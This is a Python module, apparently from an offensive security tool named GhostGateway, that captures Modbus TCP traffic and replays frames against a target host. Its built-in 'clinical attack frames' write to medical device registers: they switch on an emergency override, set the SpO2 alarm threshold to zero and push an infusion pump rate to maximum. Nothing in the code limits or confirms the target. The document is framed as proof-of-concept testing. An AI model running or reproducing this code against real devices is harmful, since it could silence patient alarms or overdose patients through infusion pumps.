"""
GhostGateway - Modbus Replay Module
Captures Modbus TCP frames and replays them to simulate replay attacks.
"""

import socket
import struct
import time
from utils.logger import get_logger

logger = get_logger("Modbus-Replay")

# Pre-built clinical Modbus frames for PoC replay
CLINICAL_REPLAY_FRAMES = [
    {
        "name": "Read Patient Monitor Status",
        "frame": bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06,
                        0x01, 0x03, 0x00, 0x00, 0x00, 0x01])
    },
    {
        "name": "Write Emergency Override ON",
        "frame": bytes([0x00, 0x02, 0x00, 0x00, 0x00, 0x06,
                        0x01, 0x06, 0x00, 0x07, 0x00, 0x01])
    },
    {
        "name": "Write Alarm Threshold - SpO2 to 0",
        "frame": bytes([0x00, 0x03, 0x00, 0x00, 0x00, 0x06,
                        0x01, 0x06, 0x00, 0x02, 0x00, 0x00])
    },
    {
        "name": "Write Infusion Pump Rate MAX",
        "frame": bytes([0x00, 0x04, 0x00, 0x00, 0x00, 0x06,
                        0x01, 0x06, 0x00, 0x05, 0x27, 0x0F])
    },
    {
        "name": "Read Holding Registers 0-10",
        "frame": bytes([0x00, 0x05, 0x00, 0x00, 0x00, 0x06,
                        0x01, 0x03, 0x00, 0x00, 0x00, 0x0A])
    },
]


class ModbusReplay:
    def __init__(self, target, port=502, unit_id=1, verbose=False):
        self.target = target
        self.port = port
        self.unit_id = unit_id
        self.verbose = verbose
        self.captured_frames = []
        self.findings = []

    def _send_raw(self, raw_bytes, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((self.target, self.port))
            sock.send(raw_bytes)
            response = sock.recv(1024)
            sock.close()
            return response
        except Exception as e:
            if self.verbose:
                logger.warning(f"Send error: {e}")
            return None

    def capture_frames(self):
        """Capture live Modbus frames (passive - listens for 5 seconds)"""
        logger.info(f"[REPLAY] Capturing frames from {self.target}:{self.port} (5 sec)")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            # Read a few frames
            for _ in range(5):
                try:
                    data = sock.recv(1024)
                    if data:
                        self.captured_frames.append(data)
                        logger.info(f"  [+] Captured frame: {data.hex()}")
                except socket.timeout:
                    break
            sock.close()
        except Exception as e:
            if self.verbose:
                logger.warning(f"Capture failed: {e}")

        logger.info(f"[REPLAY] Captured {len(self.captured_frames)} frames")

    def replay_frame(self, frame_bytes, label="Unknown"):
        """Replay a single raw Modbus frame"""
        logger.info(f"[REPLAY] Replaying: {label}")
        logger.info(f"  Frame: {frame_bytes.hex()}")
        resp = self._send_raw(frame_bytes)
        if resp:
            logger.info(f"  [+] Response received: {resp.hex()}")
            self.findings.append({
                "check": f"Replay: {label}",
                "severity": "HIGH",
                "detail": f"Frame replayed successfully. Response: {resp.hex()}"
            })
            return resp
        else:
            logger.warning(f"  [-] No response for: {label}")
            return None

    def replay_clinical_frames(self):
        """Replay pre-built clinical attack frames"""
        logger.info("[REPLAY] Replaying clinical IoT attack frames...")
        for frame_info in CLINICAL_REPLAY_FRAMES:
            self.replay_frame(frame_info["frame"], frame_info["name"])
            time.sleep(0.3)

    def replay_captured(self):
        """Replay any captured live frames"""
        if not self.captured_frames:
            logger.warning("[REPLAY] No live frames captured to replay.")
            return
        logger.info(f"[REPLAY] Replaying {len(self.captured_frames)} captured frames...")
        for i, frame in enumerate(self.captured_frames):
            self.replay_frame(frame, f"Captured-Frame-{i+1}")
            time.sleep(0.3)

    def run(self):
        logger.info("=" * 50)
        logger.info("  MODBUS REPLAY MODULE - GhostGateway")
        logger.info("=" * 50)
        self.capture_frames()
        self.replay_clinical_frames()
        self.replay_captured()
        logger.info(f"[REPLAY] Complete. {len(self.findings)} findings.")
        return self.findings
